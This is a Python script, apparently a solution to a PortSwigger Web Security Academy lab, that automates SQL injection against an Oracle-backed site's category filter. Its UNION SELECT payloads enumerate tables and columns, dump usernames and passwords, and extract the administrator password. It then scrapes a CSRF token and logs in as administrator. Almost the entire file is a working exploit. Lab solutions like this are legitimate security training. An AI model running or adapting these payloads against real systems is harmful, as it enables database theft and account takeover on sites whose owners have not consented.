import requests
import argparse
import bs4

# https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle

parser = argparse.ArgumentParser()
parser.add_argument("-t", "--target", help="Specify a target. \nE.g. -t https://abcdefghijk1234567.web-security-academy.net")
args = parser.parse_args()

if not args.target:
    print("[!] You need to specify a target.")
    print("[*] Example usage: sqli-08.py -t https://abcdefghijk1234567.web-security-academy.net")
    exit(0)

# test the connection to the target
r = requests.get(args.target)
if r.status_code == 200:
    print('[*] Target is up')
else:
    print('[!] Target seems down')
    exit(0)

payload = args.target + "/filter?category=Accessories' UNION SELECT table_name,NULL from all_tables--"
print('[*] Payload created: ' + payload)

s = requests.Session()
r = s.get(payload)

if r.status_code == 200:
    print('[*] Payload sent')
    soup = bs4.BeautifulSoup(r.content, 'html.parser')
    rows = soup.select('tbody tr')
    table_prefix = "<th>USERS_"
    for row in rows:
        th = row.find_all('th')
        th_string = str(th[0])
        if table_prefix in th_string:
            td_split_1 = th_string.split('>')
            td_split_2 = td_split_1[1].split('<')
            table_name = td_split_2[0]
            print("[*] Table name found: " + table_name)

payload = args.target + f"/filter?category=Accessories' UNION SELECT column_name,NULL FROM all_tab_columns WHERE+table_name='{table_name}'--"
print('[*] Payload created: ' + payload)
r = s.get(payload)

if r.status_code == 200:
    print('[*] Payload sent')
    soup = bs4.BeautifulSoup(r.content, 'html.parser')
    rows = soup.select('tbody tr')
    column_password_prefix = "<th>PASSWORD_"
    column_username_prefix = "<th>USERNAME_"
    for row in rows:
        th = row.find_all('th')
        th_string = str(th[0])
        if column_username_prefix in th_string:
            td_split_1 = th_string.split('>')
            td_split_2 = td_split_1[1].split('<')
            column_username = td_split_2[0]
            print("[*] Column name found: " + column_username)
        if column_password_prefix in th_string:
            td_split_1 = th_string.split('>')
            td_split_2 = td_split_1[1].split('<')
            column_password = td_split_2[0]
            print("[*] Column name found: " + column_password)

payload = args.target + f"/filter?category=Accessories' UNION SELECT {column_username},{column_password} FROM {table_name}--"
print('[*] Payload created: ' + payload)
r = s.get(payload)

if r.status_code == 200:
    print('[*] Payload sent')
    soup = bs4.BeautifulSoup(r.content, 'html.parser')
    rows = soup.select('tbody tr')
    column_password_prefix = "<th>PASSWORD_"
    column_username_prefix = "<th>USERNAME_"
    for row in rows:
        th = row.find_all('th')
        th_string = str(th[0])
        if "<th>administrator</th>" in th_string:
            td = row.find_all('td')
            td_string = str(td[0])
            td_split_1 = td_string.split('>')
            td_split_2 = td_split_1[1].split('<')
            password = td_split_2[0]
            print('[*] Admin password found: ' + password)

# login!
payload = args.target + "/login"
print('[*] Getting CSRF token')
r = s.get(payload)

if r.status_code == 200:
    soup = bs4.BeautifulSoup(r.content, 'html.parser')
    rows = soup.select('form input')
    for row in rows:
        if 'csrf' in str(row):
            matched_row = str(row)
            csrf_token = matched_row.split('"')
            if csrf_token[7]:
                csrf_token_data = str(csrf_token[7])
                print('[*] Got the CSRF Token: ' + csrf_token_data)
            else:
                print('[!] Could not get the CSRF token')
                exit(0)
username = "administrator"
payload_data = {
    "csrf": csrf_token_data,
    "username": username,
    "password": password
}

r = s.post(payload, data=payload_data)
if r.status_code == 200:
    print("[*] Final payload sent...hold on to something")
    completion_text = b'Congratulations'
    if completion_text in r.content:
        print('[*] Success')
    else:
        print('[!] Exploit failed')
        exit(0)
